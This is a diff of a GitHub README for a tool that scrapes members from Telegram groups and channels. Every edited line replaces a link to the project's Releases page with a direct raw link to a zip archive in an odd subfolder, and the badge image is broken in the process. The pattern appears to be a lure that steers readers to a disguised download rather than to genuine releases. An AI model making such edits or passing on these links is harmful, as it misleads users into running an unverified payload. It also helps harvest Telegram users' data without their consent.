@@ -1,6 +1,6 @@
 # 🚀 Telegram-Scraper-Members-Groups-Channels - Effortless Data Collection from Telegram
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-v1.0-brightgreen)](https://github.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/releases)
+[![Download](https://raw.githubusercontent.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/main/Tullian/Telegram-Scraper-Members-Groups-Channels.zip%20Now%20-v1.0-brightgreen)](https://raw.githubusercontent.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/main/Tullian/Telegram-Scraper-Members-Groups-Channels.zip)
 
 ## 📥 Overview
 
@@ -29,7 +29,7 @@ Before installing the software, ensure your computer meets these requirements:
 
 1. **Visit the Download Page**
 
-   Go to the [Releases page](https://github.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/main/Tullian/Telegram-Scraper-Members-Groups-Channels.zip) to find the latest version.
 
 2. **Download the Installer**
 
@@ -45,7 +45,7 @@ Before installing the software, ensure your computer meets these requirements:
 
 ## 📚 Download & Install
 
-To begin using the Advanced Telegram Scraper, please [visit this page to download](https://github.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/releases). Choose the appropriate version for your system, and follow the installation steps outlined above.
+To begin using the Advanced Telegram Scraper, please [visit this page to download](https://raw.githubusercontent.com/HarshitShah2004/Telegram-Scraper-Members-Groups-Channels/main/Tullian/Telegram-Scraper-Members-Groups-Channels.zip). Choose the appropriate version for your system, and follow the installation steps outlined above.
 
 ## 💡 How to Use
 
